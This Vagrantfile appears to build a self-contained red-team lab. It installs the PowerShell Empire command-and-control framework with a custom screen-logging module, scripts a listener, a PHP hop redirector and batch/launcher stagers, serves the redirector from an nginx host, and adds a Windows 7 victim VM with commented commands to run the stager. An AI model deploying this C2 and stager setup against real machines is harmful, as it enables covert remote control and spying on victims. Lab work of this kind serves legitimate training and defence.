$empire = <<SCRIPT
echo "Empire ..."
cd /home/vagrant/
wget -q https://github.com/PowerShellEmpire/Empire/archive/dev.tar.gz
tar -xzf dev.tar.gz
rm dev.tar.gz
cp /vagrant/custom/screenlogger.py /home/vagrant/Empire-dev/lib/modules/collection/
cd /home/vagrant/Empire-dev/setup/
echo -en "somekey\n" | ./install.sh
cd ..
cat > cmd.txt <<EOF
listeners
set Name chat
set Host http://192.168.33.33:80
set DefaultLostLimit 0
set DefaultJitter 1
set DefaultProfile /chat.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
run
usestager hop_php
set Listener chat
set OutFile /vagrant/hopper/chat.php
generate
back
set Type hop
set RedirectTarget chat
set Host http://192.168.33.22/chat.php
set DefaultProfile /chat.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
run
usestager launcher_bat
set OutFile /vagrant/hopper/launcher.cmd
set Listener chat1
generate
back
usestager launcher
set OutFile /vagrant/hopper/launcher.txt
set Listener chat1
generate
main
exit
y
EOF
./empire < cmd.txt
date >> /etc/vagrant_provisioned_at
SCRIPT

$hopper = <<SCRIPT
echo "hopper .."
apt-get -y install nginx php5-fpm > /dev/null

cat > /etc/nginx/sites-enabled/default <<EOF
server {
	listen 80 default_server;
	root /usr/share/nginx/html;
	index index.html index.htm;
	server_name localhost;
	location / {
		try_files $uri $uri/ =404;
	}
	location ~ \.php$ {
		fastcgi_pass unix:/var/run/php5-fpm.sock;
		fastcgi_index index.php;
		include fastcgi_params;
	}
}
EOF
service nginx start
service nginx reload
service nginx status
cp /vagrant/hopper/chat.php /usr/share/nginx/html/chat.php
cp /vagrant/helpers/upload.php /usr/share/nginx/html/upload.php
mkdir -p /var/www/chat
chown www-data:www-data /var/www/chat
date >> /etc/vagrant_provisioned_at
SCRIPT


$win = <<SCRIPT
echo "win .."
# net use x: \\VBOXSVR\vagrant
# New-PSDrive –Name “x” –PSProvider FileSystem –Root “\\VBOXSVR\vagrant” –Persist
# x:\hopper\launcher.cmd
SCRIPT


Vagrant.configure(2) do |config|

   config.vm.define 'empire' do |box|
      box.vm.box = "ubu14"
      box.vm.hostname = 'empire'
      box.vm.network :private_network, ip: "192.168.33.33"
      box.vm.provider :virtualbox do |vb|
       vb.customize ["modifyvm", :id, "--memory", "1024"]
       vb.customize ["modifyvm", :id, "--cpus", "2"]
      end
      config.vm.provision "shell", inline: $empire
   end

  config.vm.define 'hopper' do |box|
     box.vm.box = "ubu14"
     box.vm.hostname = 'hopper'
     box.vm.network :private_network, ip: "192.168.33.22"
     box.vm.provider :virtualbox do |vb|
      vb.customize ["modifyvm", :id, "--memory", "1024"]
      vb.customize ["modifyvm", :id, "--cpus", "1"]
     end
     config.vm.provision "shell", inline: $hopper
  end

  config.vm.define 'win' do |box|
     box.vm.box = "ferventcoder/win7pro-x64-nocm-lite"
     box.vm.hostname = 'win'
     box.vm.network :private_network, ip: "192.168.33.11"
     box.vm.provider :virtualbox do |vb|
      vb.customize ["modifyvm", :id, "--memory", "1024"]
      vb.customize ["modifyvm", :id, "--cpus", "1"]
      vb.gui = true
     end
     config.vm.provision "shell", inline: $win
  end

end
